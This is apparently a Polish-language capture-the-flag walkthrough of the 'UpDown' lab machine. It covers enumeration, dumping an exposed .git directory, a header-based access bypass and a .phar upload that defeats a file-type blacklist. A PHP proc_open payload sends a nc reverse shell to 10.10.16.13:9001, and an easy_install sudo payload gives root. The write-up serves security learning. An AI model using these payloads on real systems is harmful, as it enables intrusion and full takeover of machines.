![image](https://github.com/Anogota/UpDown/assets/143951834/36327627-95c2-41f9-915f-8249f5b64dbf)Pierwszy krok to nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA)
|   256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA)
|_  256 5f6e12670a66e8e2b761bec4143ad38e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
``` 
Nic nie widzimy tutaj ciekawego. Wejdz na stronie aby zobaczy co tam sie znajduje.

![image](https://github.com/Anogota/UpDown/assets/143951834/91b4a5eb-6a57-4cbf-b6e8-8538b4022bf4)

Widzimy tutaj domene, musimy ja zapisac echo "10.10.11.177 siteisup.htb" >> /etc/hosts
Nastpnym krokiem bede vhosty, uzyjemy gobuster
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u http://siteisup.htb/
``` 
Znalazlem tylko jedna subdomene. ```Found: dev.siteisup.htb (Status: 403) [Size: 281]``` Lecz nie mozemy wejsc, jest 403.
Nastepnie uzyejmy gobuster dir, aby znalezc ciekawe katalogi.
```
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]
/index.php            (Status: 200) [Size: 1131]                              
/server-status        (Status: 403) [Size: 277]
```
Mamy cos ciekawego jest dev, ale po wejsciu na strone jest ona cala biala wiec postanowilem jeszcze raz poszukac katalogow na /dev i byl to bardzo dobry wybor.
```
/.hta                 (Status: 403) [Size: 277]
/.git/HEAD            (Status: 200) [Size: 21] 
/.hta.php             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 0]  
/index.php            (Status: 200) [Size: 0]
```
Musimy uzyc narzedia git dumper.
```git-dumper http://siteisup.htb/dev/.git/ /dev```
Dzieki temu zrzucilo nam caly folder dev.

![image](https://github.com/Anogota/UpDown/assets/143951834/02893b1a-0ece-4387-8db9-593869e1fbe0)

Widzimy tam ciekawe pliki.
W changelog.txt widzimy cos ciekawego, co moze wskazywac na RCE

![image](https://github.com/Anogota/UpDown/assets/143951834/90ff3edc-700c-4b00-af91-0f96dea09692)

.htaccess wygladaj obiecujaco 
```
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
Mozemy dodac do naszego burpa naglowe Special-dev: only4dev . Dodajemy to w proxy, match and replace rules

![image](https://github.com/Anogota/UpDown/assets/143951834/9bd351d8-8cb3-48dc-a38f-a8a4a0dfa45a)

Teraz odwiedzilem ponownie ```http://dev.siteisup.htb/``` i mamy dostep do tej strony.
Mozemy tam wgrywac pliki, w kodzie moglismy ujrzec, ze wiele plikow jest tam zablokowany miedzy innymi php,py.. etc.. dziala to na zasadzie czarnej listy, ale jako iz czarne listy sa latwe do obejscia taki i w tym przypadku, uzyjemy tutaj rozszerzenia .phar. Moglismy rowniez zobaczyc, ze te uploadowanie plikow dziala jako taki curl, wiec wiec bedziemy muslie dodac troche randomych stron aby czyms sie zajol i wykonal nam kod.

![image](https://github.com/Anogota/UpDown/assets/143951834/d1ee21d5-bf82-4e7a-b8b0-1fb25c71cdee)

Nastepnie musimy przeslac ten plik, wejsc szybko w upload zobaczymy tam jakis hash md5 i wejsc w ten katalog, zobaczymy tam nasz test.phar ktory przekieruje nas na infophp
Przeanalizowalem sobie to wszystko i mozna tam zobaczyc wiele funkcji popularnych w reverse-shell

![image](https://github.com/Anogota/UpDown/assets/143951834/b7a99c90-f460-4f24-96a2-c60d25638b40)

Ale jest jedna, ktora pomoze nam wykonac RCE, znalazlem to na tej stronie 
```

<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.13 9001 >/tmp/f');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```
Musimy tylko tam troszke pozmieniac, bo na stronie ten shell wyglada troszke inaczej, teraz musimy wlaczyc nc i przeslac tego shell'a. Rozejrzalem sie troszke po stronie w katalogu dev znajduje sie siteisup, mozemy dzieki temu eskalowac z www-data do developer i uzyskac klucz ssh

![image](https://github.com/Anogota/UpDown/assets/143951834/dc92955b-e49f-4460-98a4-6e49fb18cb34)

Wystarczy nadac odpowiednie uprawienia kluczowi oraz go zapisac i dzieki temu uzyskamy dostep SSH do developer

![image](https://github.com/Anogota/UpDown/assets/143951834/dab9c6aa-3337-4608-8644-0b3d7b126f00)

Teraz juz jest z gorki aby uzyskac root'a, wpisujac sudo -l widziemy ```(ALL) NOPASSWD: /usr/local/bin/easy_install``` mozemy easy_install znalezc na gtfobins.
```
    TF=$(mktemp -d)
    echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
    sudo easy_install $TF
```
I dzieki temu mamy root'a

![image](https://github.com/Anogota/UpDown/assets/143951834/82508482-3584-4d31-b16e-a92440577986)
